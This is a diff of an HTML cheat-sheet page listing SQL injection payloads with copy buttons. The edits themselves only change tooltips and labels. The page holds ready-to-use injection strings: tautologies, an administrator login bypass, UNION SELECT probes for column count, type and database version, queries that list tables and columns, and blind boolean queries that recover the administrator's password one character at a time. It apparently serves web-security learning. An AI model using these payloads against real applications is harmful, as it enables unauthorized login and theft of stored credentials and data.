@@ -60,7 +60,7 @@ conditions are used.
 <b>C1: </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
 <b>C2: </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
 <b>C3: </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
-<button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="copy!" onclick="ctrl_C('#HDT03')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
@@ -69,7 +69,7 @@ conditions are used.
 <u>Sample:</u>
 	
 <b>C1: </b><p id="LBT01"><mark>administrator'--</mark></p> 
-<button class="button_conf button_set" title="copy!" onclick="ctrl_C('#LBT01')">.C1.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
@@ -82,16 +82,14 @@ conditions are used.
 
 <b>Method C1: </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
 <b>Method C2: </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
-
-<button class="button_conf button_set" onclick="ctrl_C('#DTT01')">.MC1.</button> |  <button class="button_conf button_set" onclick="ctrl_C('#DTT02')">.MC2.</button><br>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT01')">.MC1.</button> |  <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT02')">.MC2.</button><br>
 	
 2. get field type
 	
 <p>C1: </p><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
 <b>C2: </b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
 <b>C3: </b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
-
-<button class="button_conf button_set" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT05')">.C3.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
@@ -104,15 +102,17 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 <b>C2: </b><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p> 
 *assuming it has two columns and both are type string.
 
-<button class="button_conf button_set" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#DTT07')">.C2.</button><br>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT07')">.C2.</button><br>
 	
 <u><b>MYSQL | SQL:</b></u>
 
 <b>C1: </b><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p> 
 *assuming it has two columns and first is type string.
 
-<button class="button_conf button_set" onclick="ctrl_C('#DTT08')">.C1.</button><br>
-<b>POSTGRESQL:</b></p>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#DTT08')">.C1.</button><br>
+<b>POSTGRESQL:</b>
+
+</p>
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
@@ -133,7 +133,7 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 <b>C3: </b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 
 
-<button class="button_conf button_set" onclick="ctrl_C('#LDCT01')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT02')">.C2.</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT03')">.C3.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT03')">.C3.</button>
 <br>
 </details>
 <details>
@@ -152,7 +152,7 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 <b>C3: </b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
 </details>
 <b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
 two columns and both type string.</p>
@@ -169,13 +169,13 @@ STEP1: get query columns number
 
 STEP2: get column field type
 
-<b>C2: </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p> | non-oracle
-<b>C3: </b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p> | oracle
+<b>C2: non-oracle </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p>
+<b>C3: oracle</b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
 *assuming two columns
 
 ... after those steps, please refer to LISTING DATABASE CONTENT TECHNIQUES, it will apply the same.
 
-<button class="button_conf button_set" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" onclick="ctrl_C('#UAT03')">.C3.</button></p>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#UAT03')">.C3.</button></p>
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
@@ -184,29 +184,29 @@ Look for any new behavior after small changes.
 <details>
 <summary>CONDITIONAL RESPONSES</summary>
 	
-<b>C1: </b><p id="BAT01"><mark>' AND '1'='1</mark></p> TRUE
-<b>C2: </b><p id="BAT02"><mark>' AND '1'='2</mark></p> FALSE
+<b>C1: TRUE</b><p id="BAT01"><mark>' AND '1'='1</mark></p>
+<b>C2: FALSE</b><p id="BAT02"><mark>' AND '1'='2</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT01')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#BAT02')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT02')">.C2.</button>
 
-To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.
+To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>
 
 > <u>check if table exist ?</u>
-<b>C1: </b><p id="BAT03"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark></p> | TRUE condition means table exist !
+<b>C1: TRUE condition means table exist !</b><p id="BAT03"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT03')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT03')">.C1.</button>
 
 > <u>check if column value exist ?</u>
-C1: <p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p> | TRUE condition means column value exist !
+<b>C1: </b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p> | TRUE condition means column value exist !
 <b>C2: </b><p id="BAT05"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT04')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#BAT05')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT05')">.C2.</button>
 
 > <u>check the character lenght of the column ?</u>
 <b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
 <b>C2: </b><p id="BAT07"><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT06')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#BAT07')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT07')">.C2.</button>
 
 <b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
@@ -215,7 +215,7 @@ hits the FALSE statement.
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
 <b>C2: </b><p id="BAT09"><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT08')">.C1.</button> | <button class="button_conf button_set" onclick="ctrl_C('#BAT09')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT08')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT09')">.C2.</button>
 
 So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
 iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
@@ -224,7 +224,7 @@ iterate more times with each letter, number, etc. For that reason a pre-req is t
 
 <b>C1: </b><p id="BAT10"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark></p>
 
-<button class="button_conf button_set" onclick="ctrl_C('#BAT10')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C!" onclick="ctrl_C('#BAT10')">.C1.</button>
 
 <b>Note:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
